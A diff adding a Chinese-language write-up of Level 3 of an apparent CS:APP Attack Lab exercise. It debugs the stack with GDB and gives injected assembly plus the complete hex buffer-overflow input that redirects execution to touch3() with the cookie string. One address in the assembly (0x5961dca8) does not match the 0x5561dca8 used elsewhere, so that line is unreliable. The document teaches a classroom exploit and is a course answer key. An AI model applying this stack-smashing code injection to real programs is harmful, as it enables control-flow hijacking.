@@ -99,3 +99,75 @@ step2: ```objdump -d touch2.o > touch2.d```
 此时rsp指针地址也不再是第一次准备执行```getbuf()```时的地址了,而是又向上(向栈底)增大了8个字节.即从```0x5561dca0```变为```0x5561dca8```,这就是由于```getbuf()```执行了```retq```,返回地址被弹出,所以```rsp```向栈底移动.  
 - 然后开始执行攻击代码,此处可以看作一次```callq```,攻击代码中```pushq $0x4017ec <Touch2()>```,将```Touch2()```地址入栈,此时```rsp```地址为```0x5561dca0```,也就是这个调用攻击代码栈帧中的"返回地址",值为```Touch2()```起始地址.之后再次调用```retq```,同理此时弹出```pop``` "返回地址",此时```rip```就指向了```Touch2()```.同时,由于popq了返回地址,此时```rsp```又变为```0x5561dca8```.
 - 总结来说,返回"攻击代码"实际上时一次```call和ret```,用这个```ret```来```call Touch2()```.
+
+
+### Level3 : 执行Touch3()
+```cookie = 59b997fa```  
+和level2同理,注入攻击代码,执行touch3().首先看一下Touch3():
+
+	11 void touch3(char * sval)
+	12 {
+	13 vlevel = 3; / * Part of validation protocol * /
+	14 if (hexmatch(cookie, sval)) {
+	15 printf("Touch3!: You called touch3(\"%s\")\n", sval);
+	16 validate(3);
+	17 } else {
+	18 printf("Misfire: You called touch3(\"%s\")\n", sval);
+	19 fail(3);
+	20 }
+	21 exit(0);
+	22 }
+
+此处```Touch3()```又进一步调用了```hexmatch()```函数,且```touch3()```的参数是一个指针,这意味着我们要将字符串的地址传给```rdi```.    
+在分析```hexmatch()```:
+   
+	2 int hexmatch(unsigned val, char * sval)
+	3 {
+	4 char cbuf[110];
+	5 / * Make position of check string unpredictable * /
+	6 char * s = cbuf + random() % 100;
+	7 sprintf(s, "%.8x", val);
+	8 return strncmp(sval, s, 9) == 0;
+	9 }
+
+此处由于有一个较大的char数组,且在这个数组中不确定的位置开始,修改为```cookie```的字符串表示.故```hexmatch()```势必会在栈上保存他的局部变量.至于修改哪九个字节,这取决于random的值了.   
+故我们在```getbuf()```函数中的读入40个字节的```buffer```,也有可能会被修改.   
+这样的话就导致,如果我们将```cookie```的字符串表示(```也就是sval```),放在buffer中,那么可能会被```hexmatch()```修改.所以我们需要GDB调试,看看哪些单元是不会被修改的,然后我们再将```sval```存到哪里,并将他的地址给```rdi```,这样就会顺利执行了.
+此处注意,这个```random()```,每次程序开始运行的值是相同的,因为他的**seed一直是默认**.
+GDB调试: 
+我们在```hexmatch()```前后设置断点,观察前后的```buffer```区域的变化:   
+![](https://i.imgur.com/yMwXD55.png) 
+buffer区域从```0x5561dc78```开始.   
+运行前:  
+![](https://i.imgur.com/IzbxU5G.png)   
+  
+运行后:    
+![](https://i.imgur.com/UY01g9j.png)    
+可以看到,```0x5561dc78```到```0x5561dca0```都被修改了,是不安全的.    
+故我们可以选择```0x5561dca8```或者```0x5561dcb8```的8个字节存放我们的cookie字符串.       
+(他们其实都是0x0,该实验结果是拿正确答案进行调试的)
+故答案就显而易见了:    
+首先注入代码:   
+
+	mov $0x5961dca8 , %rdi  # 将cookie字符串的地址放入rdi中,作为参数
+	pushq $0x4018fa         # 我们将Touch3()的地址入栈.以便执行
+	retq                    
+
+之后翻译成机器码,接着在```0x5961dca8```的单元上放入字符串"59b997fa",这是cookie.   
+注意字符串我们仍然要转为ASCII码的hex表示,也就是"35 39 62 39 39 37 66 61".   
+故最终的输入为:  
+
+	48 c7 c7 a8 dc 
+	61 55 68 fa 18 
+	40 00 c3 00 00 
+	00 00 00 00 00 
+	00 00 00 00 00 
+	00 00 00 00 00 
+	00 00 00 00 00 
+	00 00 00 00 00 
+	78 dc 61 55 00 
+	00 00 00 35 39
+	62 39 39 37 66
+	61
+
+![](https://i.imgur.com/s11YGKR.png)
